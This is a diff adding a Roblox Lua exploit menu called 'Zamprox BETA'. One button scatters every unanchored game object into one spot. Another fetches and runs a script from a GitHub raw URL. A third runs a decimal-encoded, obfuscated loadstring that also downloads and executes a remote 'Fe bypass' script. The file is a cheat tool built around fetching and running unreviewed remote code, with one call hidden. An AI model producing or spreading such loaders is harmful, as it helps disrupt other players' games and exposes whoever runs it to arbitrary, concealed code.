@@ -1,0 +1,76 @@
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ZamproxGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create the main frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+mainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+-- Enable dragging
+mainFrame.Active = true
+mainFrame.Draggable = true
+
+-- Create the title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+title.BorderSizePixel = 0
+title.Text = "Zamprox BETA"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSans
+title.TextSize = 24
+title.Parent = mainFrame
+
+-- Create the text label at the bottom
+local bottomLabel = Instance.new("TextLabel")
+bottomLabel.Size = UDim2.new(1, 0, 0, 30)
+bottomLabel.Position = UDim2.new(0, 0, 1, -30)
+bottomLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+bottomLabel.BorderSizePixel = 0
+bottomLabel.Text = "YouTube: ThatGodlyBacon"
+bottomLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+bottomLabel.Font = Enum.Font.SourceSans
+bottomLabel.TextSize = 18
+bottomLabel.Parent = mainFrame
+
+-- Functions for button click events
+local function onHelloButtonClick()
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and not part.Anchored then
+            part.CFrame = CFrame.new(0, 5, 0)
+        end
+    end
+end
+
+local function onByeButtonClick()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/GithubbingCode/TuerScript-2.0/refs/heads/main/Code'))()
+end
+
+local function onGoogleButtonClick()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")() 
+end
+
+-- Create the buttons with updated texts and different print messages
+local buttonTexts = {"FE Blackhole", "TuerScript 2.0", "FE bypass GUI (works in old games)"}
+local buttonFunctions = {onHelloButtonClick, onByeButtonClick, onGoogleButtonClick}
+for i, text in ipairs(buttonTexts) do
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0.8, 0, 0, 40)
+    button.Position = UDim2.new(0.1, 0, 0.3 + (i - 1) * 0.2, 0)
+    button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    button.BorderSizePixel = 0
+    button.Text = text
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Font = Enum.Font.SourceSans
+    button.TextSize = 18
+    button.Parent = mainFrame
+
+    -- Button click event
+    button.MouseButton1Click:Connect(buttonFunctions[i])
+end
